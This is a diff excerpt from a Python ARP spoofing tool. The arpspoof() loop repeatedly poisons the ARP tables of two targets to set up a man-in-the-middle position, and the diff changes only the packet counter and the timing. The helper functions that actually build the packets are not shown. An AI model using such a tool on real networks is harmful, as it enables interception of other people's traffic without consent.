@@ -410,17 +410,17 @@ def arpspoof():
     time.sleep(1)
     mact = getm(ipo)
     mactt = getm(iptw)
-    integ = 4
+    integ = 2
     print("[Info] --> ARP Spoofing attack is started ....")
     time.sleep(1)
     print("[Instruction] --> To stop the attack and restore all the targets ARP tables, press on the left \"ctrl+c\" once or more if needed")
     try:
         while True:
             spoofing(ipo, iptw, mact)
-            time.sleep(3)
+            time.sleep(1)
             spoofing(iptw, ipo, mactt)
             print("\r ARP Spoofing packets sent: "+str(integ), end="")
-            integ += 4
+            integ += 2
             time.sleep(1)
     except:
         print("\n\n[Info] --> The attack is stopped, and all the ARP tables will be restored - please wait ....")
